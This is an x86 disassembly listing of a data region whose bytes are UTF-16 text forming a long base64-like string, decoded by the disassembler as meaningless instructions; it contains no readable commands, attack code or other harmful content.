  40a458:	65 00 44 00 57       	add    %al,%gs:0x57(%eax,%eax,1)
  40a45d:	00 55 00             	add    %dl,0x0(%ebp)
  40a460:	46                   	inc    %esi
  40a461:	00 38                	add    %bh,(%eax)
  40a463:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40a467:	00 48 00             	add    %cl,0x0(%eax)
  40a46a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a46b:	00 4a 00             	add    %cl,0x0(%edx)
  40a46e:	70 00                	jo     0x40a470
  40a470:	62 00                	bound  %eax,(%eax)
  40a472:	41                   	inc    %ecx
  40a473:	00 33                	add    %dh,(%ebx)
  40a475:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a479:	00 47 00             	add    %al,0x0(%edi)
  40a47c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a47d:	00 73 00             	add    %dh,0x0(%ebx)
  40a480:	68 00 58 00 5a       	push   $0x5a005800
  40a485:	00 6e 00             	add    %ch,0x0(%esi)
  40a488:	43                   	inc    %ebx
  40a489:	00 65 00             	add    %ah,0x0(%ebp)
  40a48c:	31 00                	xor    %eax,(%eax)
  40a48e:	75 00                	jne    0x40a490
  40a490:	71 00                	jno    0x40a492
  40a492:	5a                   	pop    %edx
  40a493:	00 45 00             	add    %al,0x0(%ebp)
  40a496:	59                   	pop    %ecx
  40a497:	00 59 00             	add    %bl,0x0(%ecx)
  40a49a:	30 00                	xor    %al,(%eax)
  40a49c:	75 00                	jne    0x40a49e
  40a49e:	62 00                	bound  %eax,(%eax)
  40a4a0:	4f                   	dec    %edi
  40a4a1:	00 61 00             	add    %ah,0x0(%ecx)
  40a4a4:	49                   	dec    %ecx
  40a4a5:	00 70 00             	add    %dh,0x0(%eax)
  40a4a8:	61                   	popa
  40a4a9:	00 30                	add    %dh,(%eax)
  40a4ab:	00 77 00             	add    %dh,0x0(%edi)
  40a4ae:	4a                   	dec    %edx
  40a4af:	00 5a 00             	add    %bl,0x0(%edx)
  40a4b2:	33 00                	xor    (%eax),%eax
  40a4b4:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a4b8:	71 00                	jno    0x40a4ba
  40a4ba:	6d                   	insl   (%dx),%es:(%edi)
  40a4bb:	00 43 00             	add    %al,0x0(%ebx)
  40a4be:	71 00                	jno    0x40a4c0
  40a4c0:	4f                   	dec    %edi
  40a4c1:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40a4c5:	00 2b                	add    %ch,(%ebx)
  40a4c7:	00 67 00             	add    %ah,0x0(%edi)
  40a4ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a4ce:	76 00                	jbe    0x40a4d0
  40a4d0:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40a4d4:	5a                   	pop    %edx
  40a4d5:	00 47 00             	add    %al,0x0(%edi)
  40a4d8:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a4dc:	32 00                	xor    (%eax),%al
  40a4de:	61                   	popa
  40a4df:	00 5a 00             	add    %bl,0x0(%edx)
  40a4e2:	49                   	dec    %ecx
  40a4e3:	00 6f 00             	add    %ch,0x0(%edi)
  40a4e6:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40a4ea:	6d                   	insl   (%dx),%es:(%edi)
  40a4eb:	00 47 00             	add    %al,0x0(%edi)
  40a4ee:	76 00                	jbe    0x40a4f0
  40a4f0:	5a                   	pop    %edx
  40a4f1:	00 6f 00             	add    %ch,0x0(%edi)
  40a4f4:	4c                   	dec    %esp
  40a4f5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4f8:	65 00 2f             	add    %ch,%gs:(%edi)
  40a4fb:	00 36                	add    %dh,(%esi)
  40a4fd:	00 72 00             	add    %dh,0x0(%edx)
  40a500:	2f                   	das
  40a501:	00 71 00             	add    %dh,0x0(%ecx)
  40a504:	7a 00                	jp     0x40a506
  40a506:	6a 00                	push   $0x0
  40a508:	4f                   	dec    %edi
  40a509:	00 43 00             	add    %al,0x0(%ebx)
  40a50c:	45                   	inc    %ebp
  40a50d:	00 32                	add    %dh,(%edx)
  40a50f:	00 33                	add    %dh,(%ebx)
  40a511:	00 35 00 55 00 62    	add    %dh,0x62005500
  40a517:	00 36                	add    %dh,(%esi)
  40a519:	00 70 00             	add    %dh,0x0(%eax)
  40a51c:	73 00                	jae    0x40a51e
  40a51e:	62 00                	bound  %eax,(%eax)
  40a520:	4d                   	dec    %ebp
  40a521:	00 49 00             	add    %cl,0x0(%ecx)
  40a524:	36 00 4c 00 6c       	add    %cl,%ss:0x6c(%eax,%eax,1)
  40a529:	00 69 00             	add    %ch,0x0(%ecx)
  40a52c:	68 00 63 00 78       	push   $0x78006300
  40a531:	00 4a 00             	add    %cl,0x0(%edx)
  40a534:	74 00                	je     0x40a536
  40a536:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a53a:	36 00 37             	add    %dh,%ss:(%edi)
  40a53d:	00 4f 00             	add    %cl,0x0(%edi)
  40a540:	78 00                	js     0x40a542
  40a542:	35 00 48 00 47       	xor    $0x47004800,%eax
  40a547:	00 4f 00             	add    %cl,0x0(%edi)
  40a54a:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40a54e:	7a 00                	jp     0x40a550
  40a550:	37                   	aaa
  40a551:	00 6e 00             	add    %ch,0x0(%esi)
  40a554:	53                   	push   %ebx
  40a555:	00 62 00             	add    %ah,0x0(%edx)
  40a558:	77 00                	ja     0x40a55a
  40a55a:	43                   	inc    %ebx
  40a55b:	00 6e 00             	add    %ch,0x0(%esi)
  40a55e:	37                   	aaa
  40a55f:	00 52 00             	add    %dl,0x0(%edx)
  40a562:	76 00                	jbe    0x40a564
  40a564:	4f                   	dec    %edi
  40a565:	00 4a 00             	add    %cl,0x0(%edx)
  40a568:	78 00                	js     0x40a56a
  40a56a:	77 00                	ja     0x40a56c
  40a56c:	45                   	inc    %ebp
  40a56d:	00 35 00 6d 00 74    	add    %dh,0x74006d00
  40a573:	00 41 00             	add    %al,0x0(%ecx)
  40a576:	57                   	push   %edi
  40a577:	00 61 00             	add    %ah,0x0(%ecx)
  40a57a:	37                   	aaa
  40a57b:	00 73 00             	add    %dh,0x0(%ebx)
  40a57e:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40a582:	6e                   	outsb  %ds:(%esi),(%dx)
  40a583:	00 6a 00             	add    %ch,0x0(%edx)
  40a586:	39 00                	cmp    %eax,(%eax)
  40a588:	6e                   	outsb  %ds:(%esi),(%dx)
  40a589:	00 75 00             	add    %dh,0x0(%ebp)
  40a58c:	59                   	pop    %ecx
  40a58d:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40a591:	00 75 00             	add    %dh,0x0(%ebp)
  40a594:	50                   	push   %eax
  40a595:	00 73 00             	add    %dh,0x0(%ebx)
  40a598:	7a 00                	jp     0x40a59a
  40a59a:	34 00                	xor    $0x0,%al
  40a59c:	4c                   	dec    %esp
  40a59d:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40a5a1:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40a5a5:	00 51 00             	add    %dl,0x0(%ecx)
  40a5a8:	34 00                	xor    $0x0,%al
  40a5aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ab:	00 70 00             	add    %dh,0x0(%eax)
  40a5ae:	37                   	aaa
  40a5af:	00 65 00             	add    %ah,0x0(%ebp)
  40a5b2:	55                   	push   %ebp
  40a5b3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5b6:	32 00                	xor    (%eax),%al
  40a5b8:	43                   	inc    %ebx
  40a5b9:	00 52 00             	add    %dl,0x0(%edx)
  40a5bc:	72 00                	jb     0x40a5be
  40a5be:	55                   	push   %ebp
  40a5bf:	00 45 00             	add    %al,0x0(%ebp)
  40a5c2:	75 00                	jne    0x40a5c4
  40a5c4:	4f                   	dec    %edi
  40a5c5:	00 55 00             	add    %dl,0x0(%ebp)
  40a5c8:	68 00 41 00 50       	push   $0x50004100
  40a5cd:	00 4f 00             	add    %cl,0x0(%edi)
  40a5d0:	5a                   	pop    %edx
  40a5d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5d4:	31 00                	xor    %eax,(%eax)
  40a5d6:	2f                   	das
  40a5d7:	00 77 00             	add    %dh,0x0(%edi)
  40a5da:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a5de:	39 00                	cmp    %eax,(%eax)
  40a5e0:	42                   	inc    %edx
  40a5e1:	00 76 00             	add    %dh,0x0(%esi)
  40a5e4:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40a5e8:	5a                   	pop    %edx
  40a5e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5ec:	68 00 5a 00 4c       	push   $0x4c005a00
  40a5f1:	00 43 00             	add    %al,0x0(%ebx)
  40a5f4:	48                   	dec    %eax
  40a5f5:	00 5a 00             	add    %bl,0x0(%edx)
  40a5f8:	46                   	inc    %esi
  40a5f9:	00 79 00             	add    %bh,0x0(%ecx)
  40a5fc:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a5ff:	00 73 00             	add    %dh,0x0(%ebx)
  40a602:	79 00                	jns    0x40a604
  40a604:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a608:	59                   	pop    %ecx
  40a609:	00 48 00             	add    %cl,0x0(%eax)
  40a60c:	59                   	pop    %ecx
  40a60d:	00 62 00             	add    %ah,0x0(%edx)
  40a610:	72 00                	jb     0x40a612
  40a612:	70 00                	jo     0x40a614
  40a614:	69 00 5a 00 6f 00    	imul   $0x6f005a,(%eax),%eax
  40a61a:	6d                   	insl   (%dx),%es:(%edi)
  40a61b:	00 51 00             	add    %dl,0x0(%ecx)
  40a61e:	31 00                	xor    %eax,(%eax)
  40a620:	35 00 58 00 44       	xor    $0x44005800,%eax
  40a625:	00 6d 00             	add    %ch,0x0(%ebp)
  40a628:	5a                   	pop    %edx
  40a629:	00 4d 00             	add    %cl,0x0(%ebp)
  40a62c:	44                   	inc    %esp
  40a62d:	00 5a 00             	add    %bl,0x0(%edx)
  40a630:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a634:	5a                   	pop    %edx
  40a635:	00 59 00             	add    %bl,0x0(%ecx)
  40a638:	52                   	push   %edx
  40a639:	00 49 00             	add    %cl,0x0(%ecx)
  40a63c:	2f                   	das
  40a63d:	00 41 00             	add    %al,0x0(%ecx)
  40a640:	2f                   	das
  40a641:	00 6a 00             	add    %ch,0x0(%edx)
  40a644:	6d                   	insl   (%dx),%es:(%edi)
  40a645:	00 67 00             	add    %ah,0x0(%edi)
  40a648:	45                   	inc    %ebp
  40a649:	00 48 00             	add    %cl,0x0(%eax)
  40a64c:	6a 00                	push   $0x0
  40a64e:	6c                   	insb   (%dx),%es:(%edi)
  40a64f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a652:	58                   	pop    %eax
  40a653:	00 50 00             	add    %dl,0x0(%eax)
  40a656:	52                   	push   %edx
  40a657:	00 4e 00             	add    %cl,0x0(%esi)
  40a65a:	37                   	aaa
  40a65b:	00 58 00             	add    %bl,0x0(%eax)
  40a65e:	42                   	inc    %edx
  40a65f:	00 52 00             	add    %dl,0x0(%edx)
  40a662:	62 00                	bound  %eax,(%eax)
  40a664:	44                   	inc    %esp
  40a665:	00 6b 00             	add    %ch,0x0(%ebx)
  40a668:	76 00                	jbe    0x40a66a
  40a66a:	61                   	popa
  40a66b:	00 69 00             	add    %ch,0x0(%ecx)
  40a66e:	33 00                	xor    (%eax),%eax
  40a670:	75 00                	jne    0x40a672
  40a672:	33 00                	xor    (%eax),%eax
  40a674:	48                   	dec    %eax
  40a675:	00 42 00             	add    %al,0x0(%edx)
  40a678:	54                   	push   %esp
  40a679:	00 53 00             	add    %dl,0x0(%ebx)
  40a67c:	61                   	popa
  40a67d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a680:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40a684:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a687:	00 33                	add    %dh,(%ebx)
  40a689:	00 42 00             	add    %al,0x0(%edx)
  40a68c:	36 00 39             	add    %bh,%ss:(%ecx)
  40a68f:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40a693:	00 63 00             	add    %ah,0x0(%ebx)
  40a696:	4a                   	dec    %edx
  40a697:	00 57 00             	add    %dl,0x0(%edi)
  40a69a:	4e                   	dec    %esi
  40a69b:	00 45 00             	add    %al,0x0(%ebp)
  40a69e:	4a                   	dec    %edx
  40a69f:	00 41 00             	add    %al,0x0(%ecx)
  40a6a2:	6c                   	insb   (%dx),%es:(%edi)
  40a6a3:	00 77 00             	add    %dh,0x0(%edi)
  40a6a6:	4b                   	dec    %ebx
  40a6a7:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  40a6ab:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ae:	50                   	push   %eax
  40a6af:	00 78 00             	add    %bh,0x0(%eax)
  40a6b2:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40a6b6:	4b                   	dec    %ebx
  40a6b7:	00 35 00 78 00 41    	add    %dh,0x41007800
  40a6bd:	00 6e 00             	add    %ch,0x0(%esi)
  40a6c0:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a6c4:	71 00                	jno    0x40a6c6
  40a6c6:	5a                   	pop    %edx
  40a6c7:	00 69 00             	add    %ch,0x0(%ecx)
  40a6ca:	36 00 33             	add    %dh,%ss:(%ebx)
  40a6cd:	00 4e 00             	add    %cl,0x0(%esi)
  40a6d0:	59                   	pop    %ecx
  40a6d1:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40a6d5:	00 46 00             	add    %al,0x0(%esi)
  40a6d8:	45                   	inc    %ebp
  40a6d9:	00 30                	add    %dh,(%eax)
  40a6db:	00 53 00             	add    %dl,0x0(%ebx)
  40a6de:	72 00                	jb     0x40a6e0
  40a6e0:	51                   	push   %ecx
  40a6e1:	00 69 00             	add    %ch,0x0(%ecx)
  40a6e4:	4d                   	dec    %ebp
  40a6e5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6e8:	4f                   	dec    %edi
  40a6e9:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a6ed:	00 39                	add    %bh,(%ecx)
  40a6ef:	00 78 00             	add    %bh,0x0(%eax)
  40a6f2:	43                   	inc    %ebx
  40a6f3:	00 73 00             	add    %dh,0x0(%ebx)
  40a6f6:	34 00                	xor    $0x0,%al
  40a6f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6f9:	00 6a 00             	add    %ch,0x0(%edx)
  40a6fc:	52                   	push   %edx
  40a6fd:	00 2b                	add    %ch,(%ebx)
  40a6ff:	00 49 00             	add    %cl,0x0(%ecx)
  40a702:	58                   	pop    %eax
  40a703:	00 70 00             	add    %dh,0x0(%eax)
  40a706:	68 00 49 00 4a       	push   $0x4a004900
  40a70b:	00 41 00             	add    %al,0x0(%ecx)
  40a70e:	56                   	push   %esi
  40a70f:	00 47 00             	add    %al,0x0(%edi)
  40a712:	49                   	dec    %ecx
  40a713:	00 36                	add    %dh,(%esi)
  40a715:	00 75 00             	add    %dh,0x0(%ebp)
  40a718:	78 00                	js     0x40a71a
  40a71a:	77 00                	ja     0x40a71c
  40a71c:	76 00                	jbe    0x40a71e
  40a71e:	32 00                	xor    (%eax),%al
  40a720:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a724:	71 00                	jno    0x40a726
  40a726:	5a                   	pop    %edx
  40a727:	00 30                	add    %dh,(%eax)
  40a729:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a72d:	00 5a 00             	add    %bl,0x0(%edx)
  40a730:	7a 00                	jp     0x40a732
  40a732:	6a 00                	push   $0x0
  40a734:	48                   	dec    %eax
  40a735:	00 57 00             	add    %dl,0x0(%edi)
  40a738:	49                   	dec    %ecx
  40a739:	00 56 00             	add    %dl,0x0(%esi)
  40a73c:	4e                   	dec    %esi
  40a73d:	00 49 00             	add    %cl,0x0(%ecx)
  40a740:	47                   	inc    %edi
  40a741:	00 38                	add    %bh,(%eax)
  40a743:	00 4d 00             	add    %cl,0x0(%ebp)
  40a746:	57                   	push   %edi
  40a747:	00 50 00             	add    %dl,0x0(%eax)
  40a74a:	78 00                	js     0x40a74c
  40a74c:	34 00                	xor    $0x0,%al
  40a74e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a74f:	00 32                	add    %dh,(%edx)
  40a751:	00 43 00             	add    %al,0x0(%ebx)
  40a754:	39 00                	cmp    %eax,(%eax)
  40a756:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a75a:	74 00                	je     0x40a75c
  40a75c:	71 00                	jno    0x40a75e
  40a75e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a75f:	00 52 00             	add    %dl,0x0(%edx)
  40a762:	78 00                	js     0x40a764
  40a764:	44                   	inc    %esp
  40a765:	00 39                	add    %bh,(%ecx)
  40a767:	00 76 00             	add    %dh,0x0(%esi)
  40a76a:	74 00                	je     0x40a76c
  40a76c:	48                   	dec    %eax
  40a76d:	00 33                	add    %dh,(%ebx)
  40a76f:	00 50 00             	add    %dl,0x0(%eax)
  40a772:	69 00 33 00 66 00    	imul   $0x660033,(%eax),%eax
  40a778:	4b                   	dec    %ebx
  40a779:	00 65 00             	add    %ah,0x0(%ebp)
  40a77c:	46                   	inc    %esi
  40a77d:	00 69 00             	add    %ch,0x0(%ecx)
  40a780:	46                   	inc    %esi
  40a781:	00 6b 00             	add    %ch,0x0(%ebx)
  40a784:	50                   	push   %eax
  40a785:	00 55 00             	add    %dl,0x0(%ebp)
  40a788:	69 00 71 00 64 00    	imul   $0x640071,(%eax),%eax
  40a78e:	68 00 51 00 61       	push   $0x61005100
  40a793:	00 42 00             	add    %al,0x0(%edx)
  40a796:	46                   	inc    %esi
  40a797:	00 5a 00             	add    %bl,0x0(%edx)
  40a79a:	51                   	push   %ecx
  40a79b:	00 37                	add    %dh,(%edi)
  40a79d:	00 75 00             	add    %dh,0x0(%ebp)
  40a7a0:	76 00                	jbe    0x40a7a2
  40a7a2:	46                   	inc    %esi
  40a7a3:	00 79 00             	add    %bh,0x0(%ecx)
  40a7a6:	48                   	dec    %eax
  40a7a7:	00 2f                	add    %ch,(%edi)
  40a7a9:	00 7a 00             	add    %bh,0x0(%edx)
  40a7ac:	41                   	inc    %ecx
  40a7ad:	00 38                	add    %bh,(%eax)
  40a7af:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7b2:	38 00                	cmp    %al,(%eax)
  40a7b4:	53                   	push   %ebx
  40a7b5:	00 41 00             	add    %al,0x0(%ecx)
  40a7b8:	4f                   	dec    %edi
  40a7b9:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a7bd:	00 4a 00             	add    %cl,0x0(%edx)
  40a7c0:	53                   	push   %ebx
  40a7c1:	00 55 00             	add    %dl,0x0(%ebp)
  40a7c4:	7a 00                	jp     0x40a7c6
  40a7c6:	43                   	inc    %ebx
  40a7c7:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40a7cb:	00 62 00             	add    %ah,0x0(%edx)
  40a7ce:	2b 00                	sub    (%eax),%eax
  40a7d0:	49                   	dec    %ecx
  40a7d1:	00 41 00             	add    %al,0x0(%ecx)
  40a7d4:	61                   	popa
  40a7d5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7d8:	49                   	dec    %ecx
  40a7d9:	00 45 00             	add    %al,0x0(%ebp)
  40a7dc:	41                   	inc    %ecx
  40a7dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7e0:	37                   	aaa
  40a7e1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7e4:	4b                   	dec    %ebx
  40a7e5:	00 78 00             	add    %bh,0x0(%eax)
  40a7e8:	30 00                	xor    %al,(%eax)
  40a7ea:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a7ee:	6a 00                	push   $0x0
  40a7f0:	4c                   	dec    %esp
  40a7f1:	00 49 00             	add    %cl,0x0(%ecx)
  40a7f4:	62 00                	bound  %eax,(%eax)
  40a7f6:	61                   	popa
  40a7f7:	00 68 00             	add    %ch,0x0(%eax)
  40a7fa:	59                   	pop    %ecx
  40a7fb:	00 39                	add    %bh,(%ecx)
  40a7fd:	00 5a 00             	add    %bl,0x0(%edx)
  40a800:	4d                   	dec    %ebp
  40a801:	00 53 00             	add    %dl,0x0(%ebx)
  40a804:	32 00                	xor    (%eax),%al
  40a806:	59                   	pop    %ecx
  40a807:	00 59 00             	add    %bl,0x0(%ecx)
  40a80a:	32 00                	xor    (%eax),%al
  40a80c:	59                   	pop    %ecx
  40a80d:	00 62 00             	add    %ah,0x0(%edx)
  40a810:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40a814:	34 00                	xor    $0x0,%al
  40a816:	74 00                	je     0x40a818
  40a818:	38 00                	cmp    %al,(%eax)
  40a81a:	79 00                	jns    0x40a81c
  40a81c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a81d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a821:	00 77 00             	add    %dh,0x0(%edi)
  40a824:	54                   	push   %esp
  40a825:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a829:	00 75 00             	add    %dh,0x0(%ebp)
  40a82c:	62 00                	bound  %eax,(%eax)
  40a82e:	4a                   	dec    %edx
  40a82f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a832:	2f                   	das
  40a833:	00 6f 00             	add    %ch,0x0(%edi)
  40a836:	37                   	aaa
  40a837:	00 46 00             	add    %al,0x0(%esi)
  40a83a:	68 00 79 00 51       	push   $0x51007900
  40a83f:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40a843:	00 6e 00             	add    %ch,0x0(%esi)
  40a846:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a849:	00 38                	add    %bh,(%eax)
  40a84b:	00 55 00             	add    %dl,0x0(%ebp)
  40a84e:	74 00                	je     0x40a850
  40a850:	6b 00 45             	imul   $0x45,(%eax),%eax
  40a853:	00 62 00             	add    %ah,0x0(%edx)
  40a856:	63 00                	arpl   %eax,(%eax)
  40a858:	51                   	push   %ecx
  40a859:	00 39                	add    %bh,(%ecx)
  40a85b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a85e:	63 00                	arpl   %eax,(%eax)
  40a860:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40a864:	42                   	inc    %edx
  40a865:	00 30                	add    %dh,(%eax)
  40a867:	00 66 00             	add    %ah,0x0(%esi)
  40a86a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a86b:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40a86f:	00 67 00             	add    %ah,0x0(%edi)
  40a872:	4e                   	dec    %esi
  40a873:	00 51 00             	add    %dl,0x0(%ecx)
  40a876:	4c                   	dec    %esp
  40a877:	00 6a 00             	add    %ch,0x0(%edx)
  40a87a:	74 00                	je     0x40a87c
  40a87c:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a880:	2b 00                	sub    (%eax),%eax
  40a882:	2b 00                	sub    (%eax),%eax
  40a884:	49                   	dec    %ecx
  40a885:	00 41 00             	add    %al,0x0(%ecx)
  40a888:	5a                   	pop    %edx
  40a889:	00 4a 00             	add    %cl,0x0(%edx)
  40a88c:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a890:	35 00 54 00 42       	xor    $0x42005400,%eax
  40a895:	00 2b                	add    %ch,(%ebx)
  40a897:	00 7a 00             	add    %bh,0x0(%edx)
  40a89a:	56                   	push   %esi
  40a89b:	00 47 00             	add    %al,0x0(%edi)
  40a89e:	56                   	push   %esi
  40a89f:	00 36                	add    %dh,(%esi)
  40a8a1:	00 36                	add    %dh,(%esi)
  40a8a3:	00 47 00             	add    %al,0x0(%edi)
  40a8a6:	6c                   	insb   (%dx),%es:(%edi)
  40a8a7:	00 51 00             	add    %dl,0x0(%ecx)
  40a8aa:	41                   	inc    %ecx
  40a8ab:	00 4f 00             	add    %cl,0x0(%edi)
  40a8ae:	37                   	aaa
  40a8af:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8b2:	75 00                	jne    0x40a8b4
  40a8b4:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a8b8:	43                   	inc    %ebx
  40a8b9:	00 70 00             	add    %dh,0x0(%eax)
  40a8bc:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40a8c0:	37                   	aaa
  40a8c1:	00 72 00             	add    %dh,0x0(%edx)
  40a8c4:	49                   	dec    %ecx
  40a8c5:	00 63 00             	add    %ah,0x0(%ebx)
  40a8c8:	5a                   	pop    %edx
  40a8c9:	00 37                	add    %dh,(%edi)
  40a8cb:	00 43 00             	add    %al,0x0(%ebx)
  40a8ce:	42                   	inc    %edx
  40a8cf:	00 37                	add    %dh,(%edi)
  40a8d1:	00 37                	add    %dh,(%edi)
  40a8d3:	00 31                	add    %dh,(%ecx)
  40a8d5:	00 42 00             	add    %al,0x0(%edx)
  40a8d8:	32 00                	xor    (%eax),%al
  40a8da:	58                   	pop    %eax
  40a8db:	00 49 00             	add    %cl,0x0(%ecx)
  40a8de:	51                   	push   %ecx
  40a8df:	00 50 00             	add    %dl,0x0(%eax)
  40a8e2:	31 00                	xor    %eax,(%eax)
  40a8e4:	35 00 72 00 48       	xor    $0x48007200,%eax
  40a8e9:	00 36                	add    %dh,(%esi)
  40a8eb:	00 50 00             	add    %dl,0x0(%eax)
  40a8ee:	42                   	inc    %edx
  40a8ef:	00 72 00             	add    %dh,0x0(%edx)
  40a8f2:	35 00 37 00 62       	xor    $0x62003700,%eax
  40a8f7:	00 63 00             	add    %ah,0x0(%ebx)
  40a8fa:	68 00 5a 00 44       	push   $0x44005a00
  40a8ff:	00 37                	add    %dh,(%edi)
  40a901:	00 48 00             	add    %cl,0x0(%eax)
  40a904:	6d                   	insl   (%dx),%es:(%edi)
  40a905:	00 4e 00             	add    %cl,0x0(%esi)
  40a908:	55                   	push   %ebp
  40a909:	00 71 00             	add    %dh,0x0(%ecx)
  40a90c:	61                   	popa
  40a90d:	00 49 00             	add    %cl,0x0(%ecx)
  40a910:	50                   	push   %eax
  40a911:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a915:	00 4a 00             	add    %cl,0x0(%edx)
  40a918:	7a 00                	jp     0x40a91a
  40a91a:	6a 00                	push   $0x0
  40a91c:	53                   	push   %ebx
  40a91d:	00 62 00             	add    %ah,0x0(%edx)
  40a920:	6c                   	insb   (%dx),%es:(%edi)
  40a921:	00 30                	add    %dh,(%eax)
  40a923:	00 30                	add    %dh,(%eax)
  40a925:	00 51 00             	add    %dl,0x0(%ecx)
  40a928:	4a                   	dec    %edx
  40a929:	00 52 00             	add    %dl,0x0(%edx)
  40a92c:	51                   	push   %ecx
  40a92d:	00 4a 00             	add    %cl,0x0(%edx)
  40a930:	2f                   	das
  40a931:	00 6e 00             	add    %ch,0x0(%esi)
  40a934:	62 00                	bound  %eax,(%eax)
  40a936:	70 00                	jo     0x40a938
  40a938:	4b                   	dec    %ebx
  40a939:	00 61 00             	add    %ah,0x0(%ecx)
  40a93c:	75 00                	jne    0x40a93e
  40a93e:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a941:	00 70 00             	add    %dh,0x0(%eax)
  40a944:	37                   	aaa
  40a945:	00 2b                	add    %ch,(%ebx)
  40a947:	00 72 00             	add    %dh,0x0(%edx)
  40a94a:	4a                   	dec    %edx
  40a94b:	00 50 00             	add    %dl,0x0(%eax)
  40a94e:	44                   	inc    %esp
  40a94f:	00 76 00             	add    %dh,0x0(%esi)
  40a952:	76 00                	jbe    0x40a954
  40a954:	37                   	aaa
  40a955:	00 52 00             	add    %dl,0x0(%edx)
  40a958:	48                   	dec    %eax
  40a959:	00 36                	add    %dh,(%esi)
  40a95b:	00 66 00             	add    %ah,0x0(%esi)
  40a95e:	38 00                	cmp    %al,(%eax)
  40a960:	35 00 31 00 62       	xor    $0x62003100,%eax
  40a965:	00 45 00             	add    %al,0x0(%ebp)
  40a968:	44                   	inc    %esp
  40a969:	00 33                	add    %dh,(%ebx)
  40a96b:	00 59 00             	add    %bl,0x0(%ecx)
  40a96e:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a971:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40a975:	00 47 00             	add    %al,0x0(%edi)
  40a978:	57                   	push   %edi
  40a979:	00 7a 00             	add    %bh,0x0(%edx)
  40a97c:	46                   	inc    %esi
  40a97d:	00 52 00             	add    %dl,0x0(%edx)
  40a980:	75 00                	jne    0x40a982
  40a982:	49                   	dec    %ecx
  40a983:	00 68 00             	add    %ch,0x0(%eax)
  40a986:	51                   	push   %ecx
  40a987:	00 6e 00             	add    %ch,0x0(%esi)
  40a98a:	6c                   	insb   (%dx),%es:(%edi)
  40a98b:	00 46 00             	add    %al,0x0(%esi)
  40a98e:	39 00                	cmp    %eax,(%eax)
  40a990:	31 00                	xor    %eax,(%eax)
  40a992:	6f                   	outsl  %ds:(%esi),(%dx)
  40a993:	00 6b 00             	add    %ch,0x0(%ebx)
  40a996:	71 00                	jno    0x40a998
  40a998:	5a                   	pop    %edx
  40a999:	00 6f 00             	add    %ch,0x0(%edi)
  40a99c:	68 00 47 00 36       	push   $0x36004700
  40a9a1:	00 6f 00             	add    %ch,0x0(%edi)
  40a9a4:	6b 00 61             	imul   $0x61,(%eax),%eax
  40a9a7:	00 56 00             	add    %dl,0x0(%esi)
  40a9aa:	30 00                	xor    %al,(%eax)
